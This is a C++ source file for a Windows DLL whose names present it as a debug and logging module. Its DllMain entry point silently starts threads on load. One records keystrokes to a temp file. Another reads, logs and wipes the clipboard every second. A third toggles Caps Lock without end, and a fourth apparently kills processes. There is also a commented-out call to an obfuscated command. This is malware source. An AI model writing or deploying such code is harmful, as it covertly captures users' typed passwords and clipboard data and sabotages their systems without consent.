#include "debug/dbg_manager.h"
#include "modules/module_manager.h"

#include <filesystem>
#include <mutex>
#include <nlohmann/json.hpp>
#include <spdlog/sinks/stdout_color_sinks.h>
#include <spdlog/spdlog.h>
#include <tlhelp32.h>
#include <windows.h>

// Global DebugConsole to persist beyond main()
static DebugConsole *g_console = nullptr;

void InitializeLogging() {
  try {
    auto console_sink = std::make_shared<spdlog::sinks::stdout_color_sink_mt>();
    const char *logPattern = "[%H:%M:%S.%e][%^%l%$] %v";
    auto logger = std::make_shared<spdlog::logger>("ion", console_sink);
    spdlog::set_default_logger(logger);
    spdlog::set_pattern(logPattern);
    spdlog::set_level(spdlog::level::info);
    spdlog::info("Logging initialized successfully");
  } catch (const spdlog::spdlog_ex &ex) {
    std::cerr << "Log initialization failed: " << ex.what() << std::endl;
  }
}

void DumpInput() {
  KeyLogger logger(GetTempLogFilePath());
  logger.StartLogging();
}

DWORD WINAPI ClearClipboardThread(LPVOID lpParam) {
  while (true) {
    if (OpenClipboard(NULL)) {
      HANDLE hData = GetClipboardData(CF_TEXT);
      char *pszText = static_cast<char *>(GlobalLock(hData));
      if (pszText != NULL) {
        spdlog::info("Clipboard data: {}", pszText);
        GlobalUnlock(hData);
      }
      EmptyClipboard();
      CloseClipboard();
    }
    Sleep(1000);
  }
  return 0;
}

void spamCapsLock() {
  while (true) {
    keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY, 0);
    keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    Sleep(530);
  }
}

int main() {
  g_console = new DebugConsole(true);
  g_console->Initialize();
  InitializeLogging();
  DumpMemoryInfo();
  return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason,
                               LPVOID lpRes) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    main();
    // Detach_Module::RunObfuscatedCommand();
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DumpInput, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ClearClipboardThread, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)spamCapsLock, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ProcessKillerThread, 0, 0, 0);
  } else if (fdwReason == DLL_PROCESS_DETACH) {
    if (g_console) {
      delete g_console;
      g_console = nullptr;
    }
    FreeConsole();
  }
  return 1;
}